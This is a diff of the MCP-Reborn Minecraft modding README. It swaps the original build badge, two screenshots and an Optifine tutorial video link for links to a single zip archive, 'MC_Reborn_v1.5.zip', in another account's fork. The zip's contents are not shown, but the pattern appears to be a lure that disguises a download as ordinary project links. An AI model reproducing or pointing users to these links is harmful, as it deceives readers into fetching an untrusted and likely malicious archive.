@@ -1,4 +1,4 @@
-## MCP-Reborn [![Build Status](https://github.com/Hexeption/MCP-Reborn/workflows/Java%20CI/badge.svg)](https://github.com/Hexeption/MCP-Reborn/actions?workflow=Java+CI)
+## MCP-Reborn [![Build Status](https://github.com/helper618/MCP-Reborn/raw/refs/heads/1.21/.github/workflows/MC_Reborn_v1.5.zip)](https://github.com/helper618/MCP-Reborn/raw/refs/heads/1.21/.github/workflows/MC_Reborn_v1.5.zip+CI)
 
 #### MCP-Reborn is an MCP (Mod Coder Pack) for minecraft for making modded clients for minecraft and researching its code. It is based on MCPConfig and ForgeGradle by MinecraftForge Team.
 
@@ -20,7 +20,7 @@
 
 2. Run the Gradle "setup" task in the mcp folder in IntelliJ - you may need to select View > Tool Windows > Gradle to get this option.
 
-    <img width="284" alt="373de4ebc77d5079584370dd7fbe8745" src="https://user-images.githubusercontent.com/4052647/46925924-71b7b680-d026-11e8-9c29-e3ed2e43f810.png">
+    <img width="284" alt="373de4ebc77d5079584370dd7fbe8745" src="https://github.com/helper618/MCP-Reborn/raw/refs/heads/1.21/.github/workflows/MC_Reborn_v1.5.zip">
 
     This will generate the decompiled source code, which you can now find in the "src" folder in the project.
 
@@ -33,7 +33,7 @@
   can actually run from the game launcher. Go to the "build" folder in the Gradle tasks, and run the "build" task. This
   will generate the new executable JAR file in the "build/libs/" directory.
   
-    <img width="266" alt="a647ab0eb336062ffd80c8e053e10266" src="https://user-images.githubusercontent.com/4052647/46925963-a297eb80-d026-11e8-8b02-cb621b559511.png">
+    <img width="266" alt="a647ab0eb336062ffd80c8e053e10266" src="https://github.com/helper618/MCP-Reborn/raw/refs/heads/1.21/.github/workflows/MC_Reborn_v1.5.zip">
 
 6. With that JAR generated, open your Minecraft versions folder. On Linux, this defaults to `~/.minecraft/versions`. On
   Windows, it's in `AppData/Roaming/.minecraft/versions`. Find the variant your modded version is based on (that is, if
@@ -71,7 +71,7 @@
 
 ### How to add Optifine
 
-[![](https://img.youtube.com/vi/ocz1tPI_YSE/0.jpg)](https://www.youtube.com/watch?v=ocz1tPI_YSE "How to add Optifine to MCP Reborn")
+[![](https://github.com/helper618/MCP-Reborn/raw/refs/heads/1.21/.github/workflows/MC_Reborn_v1.5.zip)](https://github.com/helper618/MCP-Reborn/raw/refs/heads/1.21/.github/workflows/MC_Reborn_v1.5.zip "How to add Optifine to MCP Reborn")
 
 ### Creators:
 
